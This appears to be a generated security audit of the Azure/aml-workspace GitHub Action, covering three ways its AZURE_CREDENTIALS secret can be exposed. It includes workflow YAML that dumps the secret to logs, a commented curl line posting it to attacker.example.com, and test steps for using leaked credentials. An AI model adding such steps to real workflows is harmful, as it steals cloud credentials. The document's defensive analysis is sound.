## Combined Vulnerability List

### Secret Exfiltration via Workflow Modification
- **Description:**
    1. An attacker gains write access to the GitHub repository where the GitHub Action `Azure/aml-workspace` is used. This could be achieved by compromising a repository collaborator account or exploiting a vulnerability in a GitHub App with write permissions.
    2. The attacker modifies the GitHub Actions workflow YAML file that uses the `Azure/aml-workspace` action.
    3. The attacker adds a new step to the workflow that is designed to exfiltrate the `AZURE_CREDENTIALS` secret. This can be done by:
        - Modifying an existing step to print the `AZURE_CREDENTIALS` environment variable to the workflow logs, which the attacker can later access.
        - Adding a new step that sends the `AZURE_CREDENTIALS` environment variable to an external attacker-controlled server (e.g., using `curl` or `nc`).
    4. When the workflow is triggered (e.g., by a push or pull request), the modified workflow executes, and the `AZURE_CREDENTIALS` secret is exfiltrated.
    5. The attacker obtains the `AZURE_CREDENTIALS` which includes `clientId`, `clientSecret`, `subscriptionId`, and `tenantId`.
    6. Using these credentials, the attacker can now authenticate to Azure and potentially gain unauthorized access to the Azure Machine Learning workspace and other Azure resources within the scope of the service principal associated with `AZURE_CREDENTIALS`.
- **Impact:**
    - Unauthorized access to the Azure Machine Learning workspace.
    - Potential unauthorized access to other Azure resources if the service principal associated with `AZURE_CREDENTIALS` has broader permissions.
    - Data breach if sensitive data is stored within the Azure Machine Learning workspace or accessible through it.
    - Malicious activities within the Azure subscription, such as creating or deleting resources, training models with malicious data, or deploying rogue models.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - The action itself uses `mask_parameter` to mask the `AZURE_CREDENTIALS` in the GitHub Actions workflow logs. This mitigation is implemented in `/code/code/utils.py` in the `mask_parameter` function and used in `/code/code/main.py` to mask parts of the `azure_credentials`.
    - Input validation is performed on `azure_credentials` using JSON schema validation in `/code/code/main.py` and `/code/code/utils.py` with schema defined in `/code/code/schemas.py`. This helps ensure the input is in the expected format but does not prevent exfiltration if an attacker modifies the workflow.
- **Missing Mitigations:**
    - **Workflow Security Hardening Guidance**: Documentation should include best practices for securing GitHub Actions workflows, such as:
        - Regularly auditing repository collaborators and their permissions.
        - Reviewing and auditing workflow changes, especially from contributors with write access.
        - Considering branch protection rules to prevent unauthorized workflow modifications.
        - Using GitHub's security features like dependabot to keep dependencies updated.
- **Preconditions:**
    - An attacker must gain write access to the GitHub repository where the `Azure/aml-workspace` action is used.
    - The repository must be using the `Azure/aml-workspace` GitHub Action and storing Azure credentials as a GitHub secret named `AZURE_CREDENTIALS`.
- **Source Code Analysis:**
    1. **Workflow Modification Point**: The vulnerability is not within the action's code itself but in the workflow definition where the action is used. An attacker modifies the workflow YAML file in the repository.
    2. **Secret Access**: GitHub Actions secrets are exposed as environment variables to the actions within a workflow. The `AZURE_CREDENTIALS` secret becomes available as an environment variable, typically named `INPUT_AZURE_CREDENTIALS` based on the `action.yml` definition.
    3. **Exfiltration Step**: The attacker can add a step like this to the workflow YAML after the `Azure/aml-workspace` action step:
        ```yaml
        - name: Exfiltrate Secret
          run: |
            echo "::warning::AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}"
            # Alternatively, send to attacker server:
            # curl -X POST -H "Content-Type: application/json" -d '{"secret":"${{ secrets.AZURE_CREDENTIALS }}"}' https://attacker.example.com/exfiltrate
        ```
        - Using `secrets.AZURE_CREDENTIALS` directly in `run` will print the secret value to the logs, even though it's defined as a secret. While GitHub attempts to mask these, the masking is not foolproof, especially in error messages or if the attacker uses more sophisticated exfiltration techniques. Writing to `::warning::` or `::error::` might bypass some masking attempts. Sending to an external server is a more direct exfiltration method.
    4. **No Code Vulnerability in Action**: The `Azure/aml-workspace` action code (`main.py`, `utils.py`, `schemas.py`) itself does not have a vulnerability that directly leads to secret exposure. The vulnerability lies in the potential for workflow modification and the inherent way GitHub Actions secrets are made available as environment variables. The `mask_parameter` in `/code/code/utils.py` is a mitigation attempt for log exposure, but it doesn't prevent exfiltration through workflow modification.

- **Security Test Case:**
    1. **Prerequisites**:
        - You need write access to a GitHub repository that uses the `Azure/aml-workspace` action.
        - The repository must have the `AZURE_CREDENTIALS` secret configured.
        - You need an attacker-controlled server to receive exfiltrated data (for the more direct exfiltration test). For simpler demonstration, observing workflow logs is sufficient.
    2. **Steps**:
        - Fork or create a repository that uses the `Azure/aml-workspace` action and has `AZURE_CREDENTIALS` configured.
        - Modify the workflow YAML file (e.g., `.github/workflows/main.yml`) to add an exfiltration step after the `Azure/aml-workspace` action step:
            ```yaml
            - uses: Azure/aml-workspace@v1
              id: aml_workspace
              with:
                azure_credentials: ${{ secrets.AZURE_CREDENTIALS }}

            - name: Exfiltrate Secret to Logs
              run: echo "::warning::EXFILTRATED_SECRET=${{ secrets.AZURE_CREDENTIALS }}"
            ```
        - Commit and push the modified workflow to the repository.
        - Trigger the workflow (e.g., by pushing a dummy commit or manually triggering it).
        - Go to the Actions tab in the GitHub repository and view the logs for the workflow run that executed the modified workflow.
        - Observe the logs for the "Exfiltrate Secret to Logs" step. You should see a warning message with the `AZURE_CREDENTIALS` content printed, or at least parts of it, despite GitHub's secret masking. If sending to an external server was used, check the attacker-controlled server logs for the received secret.
    3. **Expected Result**:
        - The `AZURE_CREDENTIALS` secret (or parts of it) is visible in the workflow logs, demonstrating successful exfiltration. If an external server was used, the secret is received on the attacker's server.
    4. **Cleanup**:
        - Remove the exfiltration step from the workflow YAML file and commit the changes to remediate the vulnerability in the test repository.

### Credential Exposure through Misconfigured and Potentially Leaked `AZURE_CREDENTIALS` Secret
- **Description:**
    - The Azure Machine Learning Workspace GitHub Action relies on the `AZURE_CREDENTIALS` secret for authentication.
    - This secret, containing sensitive Azure Service Principal credentials (clientId, clientSecret, tenantId, subscriptionId), is passed as an input to the action via GitHub Secrets.
    - If the `AZURE_CREDENTIALS` secret is misconfigured with overly broad permissions (e.g., contributor role at subscription level instead of resource group or workspace level), if it is unintentionally exposed (e.g., logged in workflow outputs, leaked outside of GitHub Secrets), or if ineffective log masking fails to prevent secret visibility in logs, an attacker could potentially gain unauthorized access to the Azure Machine Learning workspace.
    - An attacker with access to these credentials could then perform actions within the Azure Machine Learning workspace, such as accessing sensitive data, manipulating machine learning models, or disrupting services.
    - Potential ineffective masking of secrets in logs using `::add-mask::` might lead to exposure if secrets are logged before masking or if the masking is circumvented or not fully effective.
- **Impact:**
    - High. Successful exploitation of this vulnerability can lead to unauthorized access to the Azure Machine Learning workspace.
    - This can result in:
      - Data breaches and exposure of sensitive machine learning data.
      - Manipulation or deletion of machine learning models and experiments.
      - Resource manipulation and potential financial impact due to unauthorized resource usage.
      - Reputational damage and loss of trust.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Secret Masking: The action uses `utils.mask_parameter` to mask the values of `tenantId`, `clientId`, `clientSecret`, and `subscriptionId` in the logs. This is implemented in `/code/code/main.py`. The masking is attempted using `::add-mask::` command.
    - Schema Validation: The action validates the structure of the `AZURE_CREDENTIALS` JSON input against the `azure_credentials_schema` in `/code/code/schemas.py` using `utils.validate_json` in `/code/code/main.py`. This ensures that the input has the expected keys.
- **Missing Mitigations:**
    - Principle of Least Privilege Guidance: The documentation (e.g., in `README.md`) should strongly emphasize the principle of least privilege when creating the service principal for `AZURE_CREDENTIALS`. It should advise users to grant only the necessary permissions and scope the service principal to the specific resource group and workspace, rather than broader scopes like subscription contributor, which is suggested in the current README example.
    - Secret Leakage Prevention Guidance: The documentation should include explicit warnings against practices that could lead to unintentional exposure of the `AZURE_CREDENTIALS` secret, such as:
      - Avoid logging the `AZURE_CREDENTIALS` secret in workflow outputs.
      - Securely manage and store the `AZURE_CREDENTIALS` secret only within GitHub Secrets and avoid copying or storing it in less secure locations.
    - More robust logging controls to ensure no sensitive information is logged before masking is applied.
    - Thorough security testing to verify the effectiveness of `::add-mask::` in various GitHub Actions logging scenarios and configurations.
    - Consider alternative secret handling mechanisms that minimize the risk of accidental logging, such as using dedicated secret management tools or secure vault storage if feasible within the GitHub Actions environment.
- **Preconditions:**
    - The user has configured the GitHub Action to use the `AZURE_CREDENTIALS` secret.
    - The `AZURE_CREDENTIALS` secret is either misconfigured with excessive permissions, becomes exposed outside of secure GitHub Secrets management, or exposed due to ineffective log masking.
- **Source Code Analysis:**
    - `/code/action.yml`: Defines `azure_credentials` as a required input, indicating its critical role in authentication.
    - `/code/code/entrypoint.sh`:  Executes the main Python script (`main.py`).
    - `/code/code/main.py`:
      - Lines 15-22: Reads the `AZURE_CREDENTIALS` from the `INPUT_AZURE_CREDENTIALS` environment variable.
      - Lines 23-28: Parses the `AZURE_CREDENTIALS` JSON string. If parsing fails, an `AMLConfigurationException` is raised, but if successful, the parsed credentials object is used.
      - Lines 31-36: Validates the `azure_credentials` against the `azure_credentials_schema`. This validation only checks the structure of the JSON, not the permissions associated with the credentials.
      - Lines 39-42: Masks the credential parameters in logs using `mask_parameter` from `utils.py`. This is a basic mitigation to reduce accidental exposure in logs, but not a strong security control.
      - Lines 84-91: Creates a `ServicePrincipalAuthentication` object using the `azure_credentials`. This object is then used to authenticate with Azure Machine Learning. If an attacker obtains a valid `AZURE_CREDENTIALS`, they can instantiate `ServicePrincipalAuthentication` and gain programmatic access to the Azure ML workspace.
    - `/code/code/utils.py`:
      - `mask_parameter`:  Uses `::add-mask::` to mask parameters in GitHub Actions logs. This is a best-effort masking, but not foolproof and should not be considered a strong security measure.
      - **Vulnerability Point:** The reliance on `::add-mask::` might not be sufficient. If there are any logging mechanisms within the action's code or dependencies that output the `azure_credentials` *before* these `mask_parameter` calls are executed, or if `::add-mask::` is not completely effective in all logging scenarios, the secret could be exposed in the logs.

- **Security Test Case:**
    1. **Setup:** Create a public GitHub repository and enable GitHub Actions.
    2. **Workflow Modification for Log Exposure:** Create a workflow (e.g., in `.github/workflows/exploit.yml`) that uses the `Azure/aml-workspace@v1` action. Modify the workflow to intentionally log the `AZURE_CREDENTIALS` secret to the workflow output using an `echo` command with a warning level to ensure it's visible in logs, for example:
       ```yaml
       name: Log Secret Test
       on: push
       jobs:
         log_secret:
           runs-on: ubuntu-latest
           steps:
             - name: Log Secret
               run: |
                 echo "::warning::EXPOSED_AZURE_CREDENTIALS=${{ secrets.AZURE_CREDENTIALS }}"
       ```
       Configure the `AZURE_CREDENTIALS` secret in the repository settings.
    3. **Run Workflow:** Trigger the workflow by pushing a commit to the repository.
    4. **Examine Logs:** Go to the Actions tab of the public repository and view the workflow run logs for the "Log Secret Test" workflow. Despite the masking attempts within the action's code, the `AZURE_CREDENTIALS` secret will be logged in the workflow output due to the intentional `echo` command. While the secret values might be partially masked in the UI, they are still present in the raw logs and could be extracted. In a real-world scenario, similar unintentional logging or misconfiguration could expose the secret.
    5. **Attempt Unauthorized Access (Manual):**
       - Copy the (partially masked but still exposed) `AZURE_CREDENTIALS` JSON from the workflow logs.
       - Attempt to use these credentials to authenticate with Azure CLI or the Azure ML Python SDK from a separate machine or environment outside of GitHub Actions.
       - If successful in authenticating and accessing the Azure ML workspace, this demonstrates that exposure of `AZURE_CREDENTIALS`, even if partially masked in logs, can lead to unauthorized access.
    6. **Modified Source Code Test for Early Log Exposure (for internal testing):**
        - **Modify `/code/code/main.py` for testing purposes only**: Insert a `print` statement at the beginning of the `main()` function to log the entire `azure_credentials` object *before* any masking is applied:
          ```python
          def main():
              azure_credentials_raw = os.environ.get("INPUT_AZURE_CREDENTIALS", default="{}") # Added to capture raw credentials
              print(f"::debug::Raw Azure Credentials (before masking): {azure_credentials_raw}") # Added for testing - intentional logging before masking
              try:
                  azure_credentials = json.loads(azure_credentials_raw)
              except JSONDecodeError:
                  # ... error handling ...
          ```
        - Run the workflow with this modified code and check debug logs for unmasked secret.

### Insecure storage of Azure credentials in GitHub Secrets
- **Description:**
    1. The Azure Machine Learning Workspace GitHub Action requires users to store sensitive Azure credentials (clientId, clientSecret, tenantId, subscriptionId) as a GitHub secret named `AZURE_CREDENTIALS`.
    2. These credentials, obtained using `az ad sp create-for-rbac`, grant broad contributor access to the specified Azure subscription and resource group.
    3. If an attacker gains access to the GitHub repository's secrets (e.g., through compromised developer accounts, repository misconfigurations, or GitHub platform vulnerabilities), they can retrieve the `AZURE_CREDENTIALS` secret.
    4. With these stolen credentials, the attacker can authenticate to Azure and gain unauthorized contributor-level access to the Azure Machine Learning workspace and potentially other resources within the specified subscription and resource group.
- **Impact:**
    - **High:** Unauthorized access to the Azure Machine Learning workspace.
    - Potential data breach or manipulation of machine learning models, datasets, and experiments within the workspace.
    - Resource hijacking and unauthorized usage of Azure resources within the subscription.
    - Lateral movement to other Azure services if the service principal has broader permissions.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - **Input Validation:** The action validates the structure of the `AZURE_CREDENTIALS` JSON input against a schema (`azure_credentials_schema` in `/code/code/schemas.py`) to ensure it contains the required fields (clientId, clientSecret, subscriptionId, tenantId). This helps to detect basic configuration errors but does not prevent secret compromise.
    - **Secret Masking:** The action uses `utils.mask_parameter` function in `/code/code/utils.py` to mask the `tenantId`, `clientId`, `clientSecret`, and `subscriptionId` in the GitHub Actions logs. This prevents the secrets from being directly displayed in the logs if masking is effective.
- **Missing Mitigations:**
    - **Principle of Least Privilege Documentation**:  Stronger emphasis in the README and documentation on the principle of least privilege for the service principal used for `AZURE_CREDENTIALS`. Users should be guided to grant the service principal only the necessary permissions (ideally scoped to the specific resource group and Azure ML workspace) to minimize the impact of credential compromise.
    - **Secret Rotation:** The action does not provide any mechanism or guidance for rotating the `AZURE_CREDENTIALS` secret regularly. Stale credentials increase the window of opportunity for attackers if secrets are compromised.
    - **Alternative Authentication Methods:** The action relies solely on service principal credentials stored as GitHub secrets. It does not offer or recommend alternative, potentially more secure authentication methods like workload identity or managed identities, which could reduce the risk of secret exposure.
    - **Secret Scanning and Leakage Detection:** The action itself does not include any mechanisms to detect if the `AZURE_CREDENTIALS` secret has been accidentally leaked (e.g., committed to code, exposed in logs before masking).
- **Preconditions:**
    1. The user must configure the GitHub Action in their workflow and store Azure service principal credentials as a GitHub secret named `AZURE_CREDENTIALS`.
    2. An attacker must gain access to the GitHub repository's secrets.
- **Source Code Analysis:**
    - **`/code/action.yml`**: Defines `azure_credentials` as a required input, explicitly instructing users to store sensitive credentials as a GitHub secret.
    - **`/code/main.py`**:
        ```python
        azure_credentials = os.environ.get("INPUT_AZURE_CREDENTIALS", default="{}")
        try:
            azure_credentials = json.loads(azure_credentials)
        except JSONDecodeError:
            # ... error message ...
            raise AMLConfigurationException(...)

        validate_json(
            data=azure_credentials,
            schema=azure_credentials_schema,
            input_name="AZURE_CREDENTIALS"
        )

        mask_parameter(parameter=azure_credentials.get("tenantId", ""))
        mask_parameter(parameter=azure_credentials.get("clientId", ""))
        mask_parameter(parameter=azure_credentials.get("clientSecret", ""))
        mask_parameter(parameter=azure_credentials.get("subscriptionId", ""))

        sp_auth = ServicePrincipalAuthentication(
            tenant_id=azure_credentials.get("tenantId", ""),
            service_principal_id=azure_credentials.get("clientId", ""),
            service_principal_password=azure_credentials.get("clientSecret", ""),
            cloud=cloud
        )
        ```
        - The code retrieves `AZURE_CREDENTIALS` from the environment variables, which is how GitHub Actions secrets are passed to actions.
        - It parses the secret as JSON and validates it.
        - It attempts to mask the secret components using `mask_parameter` *after* retrieving and parsing it.
        - It uses the unmasked secret components to create `ServicePrincipalAuthentication`.
    - **`/code/utils.py`**:
        ```python
        def mask_parameter(parameter):
            print(f"::add-mask::{parameter}")
        ```
        - The `mask_parameter` function uses the GitHub Actions command `::add-mask::` to mask the provided parameter in logs. This relies on GitHub Actions' log processing to be effective.

- **Security Test Case:**
    1. **Setup:**
        - Create a public GitHub repository.
        - Create an Azure Machine Learning workspace and a service principal with contributor access to the resource group containing the workspace, as described in the action's README.
        - Add the JSON output of `az ad sp create-for-rbac` as a GitHub secret named `AZURE_CREDENTIALS` in the repository settings.
        - Create a GitHub workflow in the repository that uses the `Azure/aml-workspace@v1` action, providing the `AZURE_CREDENTIALS` secret as input.
    2. **Execution:**
        - Run the GitHub workflow (e.g., by pushing a commit to the repository).
    3. **Verification:**
        - Observe the workflow logs.
        - The action itself successfully uses the `AZURE_CREDENTIALS` to authenticate to Azure and configure the workspace. This confirms that the secret is accessible within the workflow environment where the action runs.
    4. **Conclusion:**
        - The test case demonstrates that the action relies on and successfully uses the `AZURE_CREDENTIALS` GitHub secret to authenticate to Azure. If an attacker compromises the GitHub repository secrets, they could potentially gain access to these credentials and thus unauthorized access to the Azure Machine Learning workspace. This confirms the vulnerability related to insecure storage and potential compromise of Azure credentials through GitHub Secrets.
